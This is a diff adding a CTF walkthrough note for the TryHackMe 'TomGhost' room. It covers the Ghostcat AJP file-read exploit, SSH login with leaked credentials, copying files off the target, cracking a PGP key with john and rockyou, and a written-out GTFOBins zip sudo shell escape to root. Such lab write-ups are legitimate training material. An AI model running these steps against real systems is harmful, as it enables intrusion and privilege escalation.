@@ -310,5 +310,77 @@ AgentSudo
 
 
 ======================================================================================
+ TomGhost
+	nmap scan-> 
+	22/tcp ssh
+	53/tcp tcpwrapped
+	8009/tcp ajp13 Apache Jserv v1.3
+	8080/tcp http Apache Tomcat 9.0.30
+
+	goto exploit db webpage and search tomcat , Found "Apache Tomcat - AJP 'Ghostcat File Read/Inclusion"
 	
+         copy code from https://www.exploit-db.com/exploits/48143 & save as python file
+	and run -> python code.py <IP addr of webserver>   --> got credentials
+	
+	ssh with above credential
+	ssh skyfuck@10.10.127.181   -> enter yes, then password -> login success
+	skyfuck$ ls, Found credentials.pgp and 1 more file
+	skyfuck$ cd /home/  -> merlin skyfuck    folders found
+	>cd merlin/
+	>ls  //found user.txt
+	>cat user.txt --? got flag
+
+	//lets do privilize escalation
+	>sudo -l   , enter password when prompt //error user skyfuck may nt sudo on ubuntu
+
+	skyfuck@ubuntu:/home/merlin$cd ~   //to navigate to main folder
+	skyfuck@ubuntu:$ls
+		creentials.pgp  tryhackme.asc
+
+	skyfuck@ubuntu: python3 -m http-server     //started server to host our files, note down port number once started server for file browse
+
+	browser-> 10.10.127.181:8000 --> download above 2 files
+
+	we can download file using scp protocol
+	>scp tryhackme.asc kali@IP address of attacker machine:/home/kali/tryhackme ( path to store)
+
+	decrypt the pgp file
+	>gpg --decrypt credentials.pgp    //failed error decryption failed: No secret key
+	we need to find secret key to decrypt above file
+
+	root@kali: gpg2john tryhackme.asc > tryhackme.hash    //hash file created
+
+	root@kali:jhon tryhackme.hash --wordlist=/path/to/rockyou.txt    //found password
+
+	try to import tryhackme.asc
+	>gpg import tryhackme.asc-> asked for passphrase enter above password we got recently
+
+	//Now try decrypt
+	>gpg --decrypt credentials.pgp   //asked for passphrase enter above password we got recently
+	decrypt successful and we got password for merlin user
+
+	try login merlin as su
+	skyfuck@ubuntu: su merlin  //enter password we got from above step --> SUCCESS
+	merlin@ubuntu:/home/skyfuck$ sudo -l   //(root:root) NOPASSWD: /usr/bin/zip
+	
+	GTFOBins site, search for ZIP  suid 
+	https://gtfobins.github.io/gtfobins/zip/
+		
+	It can be used to break out from restricted environments by spawning an interactive system shell.
+
+	//enter below commands on by one
+	TF=$(mktemp -u)
+	zip $TF /etc/hosts -T -TT 'sh #'
+	rm $TF
+
+	After enter above commands check we got as root
+	>whoami   //shown root
+	
+	>cat /root/root.txt   //Found flag
+
+======================================================================================
+
+
+
+
 
